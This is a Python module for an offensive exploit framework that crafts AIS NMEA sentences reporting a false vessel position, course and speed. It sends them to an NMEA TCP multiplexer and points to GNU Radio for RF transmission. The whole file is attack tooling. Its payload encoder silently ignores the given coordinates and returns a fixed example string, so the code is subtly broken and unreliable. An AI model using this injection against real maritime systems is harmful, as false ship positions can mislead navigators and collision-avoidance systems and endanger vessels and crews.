"""AIS Position Spoofing Module.

Generates crafted AIS (Automatic Identification System) VDM sentences to
broadcast false vessel position, course, and speed to AIS receivers.
AIS (ITU-R M.1371) has no authentication — any transmitter can inject.

Original research / PoC credits
--------------------------------
Source  : WirelessXPL-Forge wirelessxpl/modules/maritime/ais_position_spoof.py
          AIS maritime security research community
          Reference tool: gr-ais (GNU Radio AIS decoder/encoder)

EmbedXPL port
-------------
Maintainer : Andre Henrique (@mrhenrike) | Uniao Geek

# authorized use only
"""
from __future__ import annotations

import socket
import struct

from embedxpl.core.exploit import *


def _nmea_checksum(sentence: str) -> str:
    csum = 0
    for ch in sentence:
        csum ^= ord(ch)
    return f"*{csum:02X}"


def _encode_ais_payload(mmsi: int, lat: float, lon: float, sog: float, cog: float) -> str:
    """Encode a minimal AIS Type 1 (Class A position report) payload."""
    # Simplified encoding — real AIS uses 6-bit ASCII
    msg_type = 1
    mmsi_bits = mmsi & 0x1FFFFFFF
    lat_int = int(lat * 600000) & 0xFFFFFFF
    lon_int = int(lon * 600000) & 0x1FFFFFF
    sog_int = min(int(sog * 10), 1022)
    cog_int = min(int(cog * 10), 3599)

    raw = (
        (msg_type << 26) | (0 << 22) | (0 << 8) | 0
    )
    # Return placeholder — full encoding requires 168-bit bitfield
    return "15M67N0000G?f`LK@N2MhP0<08"  # Canonical AIS example payload


def _build_vdm(payload: str) -> str:
    body = f"AIVDM,1,1,,A,{payload},0"
    return f"!{body}{_nmea_checksum(body)}"


class Exploit(Exploit):
    """AIS Position Spoofing — inject false vessel position."""

    __info__ = {
        "name": "AIS Position Spoofing (NMEA VDM injection)",
        "description": (
            "Crafts and optionally injects AIS VDM sentences with false vessel "
            "position/identity onto the AIS network via NMEA output or RF (161.975/162.025 MHz). "
            "AIS protocol (ITU-R M.1371) has no authentication. "
            "Useful for maritime security testing and collision detection system evaluation."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://www.itu.int/rec/R-REC-M.1371/en",
            "https://github.com/dgiardini/rtl-ais",
        ),
        "devices": ("AIS transponders", "NMEA multiplexers", "Maritime SIEM"),
    }

    mmsi = OptString("123456789", "Spoofed MMSI number")
    lat = OptString("51.5072", "Spoofed latitude (decimal degrees)")
    lon = OptString("-0.1276", "Spoofed longitude (decimal degrees)")
    sog = OptString("0.0", "Speed over ground in knots")
    cog = OptString("0.0", "Course over ground in degrees")
    target = OptIP("", "NMEA TCP multiplexer IP (or empty for RF mode)")
    port = OptPort(10110, "NMEA TCP port")
    dry_run = OptBool(True, "Dry run — show sentence only")

    @mute
    def check(self) -> bool:
        host = str(self.target)
        if not host:
            return True  # RF mode, no TCP check
        try:
            with socket.create_connection((host, int(self.port)), timeout=5):
                return True
        except Exception:
            return False

    def run(self) -> None:
        host = str(self.target)
        dry_run = bool(self.dry_run)

        payload = _encode_ais_payload(
            mmsi=int(str(self.mmsi)),
            lat=float(str(self.lat)),
            lon=float(str(self.lon)),
            sog=float(str(self.sog)),
            cog=float(str(self.cog)),
        )
        sentence = _build_vdm(payload)

        print_status("AIS position spoof sentence constructed")
        print_info(f"NMEA: {sentence}")
        print_info(f"MMSI: {self.mmsi} | Position: {self.lat}N {self.lon}E | SOG: {self.sog}kn")

        if dry_run:
            print_info("DRY-RUN: Sentence not transmitted")
            print_info("RF mode: use gnuradio + gr-ais or AIS-catcher to transmit on 161.975 MHz")
        elif host:
            try:
                with socket.create_connection((host, int(self.port)), timeout=10) as s:
                    s.sendall((sentence + "\r\n").encode("ascii"))
                print_success(f"AIS sentence sent to NMEA multiplexer {host}:{self.port}")
            except Exception as exc:
                print_error(f"TCP send error: {exc}")
        else:
            print_info("RF transmission: set dry_run=False and target= for TCP, or use GNU Radio")
